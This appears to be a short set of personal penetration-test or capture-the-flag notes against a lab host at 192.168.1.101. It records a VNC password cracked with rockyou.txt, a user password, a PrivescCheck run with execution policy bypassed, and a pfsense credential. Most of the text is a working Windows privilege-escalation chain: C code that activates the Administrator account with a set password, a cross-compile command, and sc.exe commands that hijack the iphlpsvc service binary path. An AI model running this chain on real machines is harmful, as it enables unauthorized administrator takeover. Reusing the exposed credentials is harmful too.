url=192.168.1.101

nmap

vnc port 5900
password is rockyou (manually testing rockyou.txt)
same for user is iloveyou

[PrivescCheck](https://github.com/itm4n/PrivescCheck)

file transfer over updog

```sh
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML
```

# Activate Admin user and set password
```c
#include <windows.h>
#include <stdio.h>

int main() {
    system("net user Administrator P@ssw0rd123 /active:yes");
    return 0;
}

```

compile like that:

`x86_64-w64-mingw32-gcc admin.c -o admin.exe`

file transfer over updog

```sh
sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\admin.exe"
sc.exe stop iphlpsvc
sc.exe start iphlpsvc
```


pfsense cred: FyDRAquukjS2